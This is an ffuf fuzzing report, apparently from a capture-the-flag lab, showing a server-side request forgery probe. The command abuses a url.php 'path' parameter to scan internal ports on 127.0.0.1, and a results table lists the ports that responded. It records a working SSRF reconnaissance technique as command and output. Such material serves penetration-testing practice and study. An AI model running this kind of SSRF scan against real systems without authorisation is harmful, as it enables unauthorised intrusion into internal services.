# FFUF Report

  Command line : `ffuf -u http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ -fs 2 -w allPortNumbers.txt -o ffuf-allports.md -of md`
  Time: 2023-02-02T20:14:26Z

  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | Duration | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | 110 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:110 |  | 111 | 200 | 187 | 16 | 18 | text/html; charset=UTF-8 | 413.002028ms |  |
  | 90 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:90 |  | 91 | 200 | 156 | 10 | 12 | text/html; charset=UTF-8 | 570.961175ms |  |
  | 320 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:320 |  | 321 | 200 | 1232 | 93 | 27 | text/html; charset=UTF-8 | 56.159592ms |  |
  | 200 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:200 |  | 201 | 200 | 22 | 2 | 4 | text/html; charset=UTF-8 | 812.076902ms |  |
  | 22 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:22 |  | 23 | 200 | 62 | 3 | 5 | text/html; charset=UTF-8 | 4.317040875s |  |
  | 888 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:888 |  | 889 | 200 | 3955 | 449 | 79 | text/html; charset=UTF-8 | 174.80784ms |  |
  | 3306 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:3306 |  | 3307 | 200 | 123 | 5 | 3 | text/html; charset=UTF-8 | 166.126252ms |  |
  | 4444 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:4444 |  | 4445 | 200 | 613 | 18 | 19 | text/html; charset=UTF-8 | 450.17469ms |  |
  | 8080 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:8080 |  | 8081 | 200 | 994 | 47 | 3 | text/html; charset=UTF-8 | 131.963166ms |  |
  | 60000 | http://10.129.1.117:60000/url.php?path=http://127.0.0.1:60000 |  | 60001 | 200 | 1171 | 226 | 79 | text/html; charset=UTF-8 | 119.867292ms |  |
  